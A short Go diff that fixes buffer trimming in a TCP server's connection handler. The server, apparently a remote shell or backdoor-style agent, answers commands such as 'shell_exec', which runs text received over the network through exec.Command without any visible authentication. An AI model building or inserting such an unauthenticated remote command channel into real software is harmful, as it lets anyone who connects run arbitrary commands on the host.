@@ -50,9 +50,9 @@ func handleConnection(conn net.Conn) {
 		return
 	}
 
-	log.Println("Client message:", string(buffer[:len(buffer)-2]))
+	log.Println("Client message:", string(buffer[:len(buffer)-1]))
 
-	switch string(buffer[:len(buffer)-2]) {
+	switch string(buffer[:len(buffer)-1]) {
 	case "shell_exec":
 		conn.Write([]byte(shellExec(conn)))
 	case "whichos":
@@ -76,7 +76,7 @@ func shellExec(conn net.Conn) string {
 		return "Connection closed."
 	}
 
-	cmd := exec.Command(string(buffer[:len(buffer)-2]))
+	cmd := exec.Command(string(buffer[:len(buffer)-1]))
 	stdout, err := cmd.Output()
 
 	if err != nil {
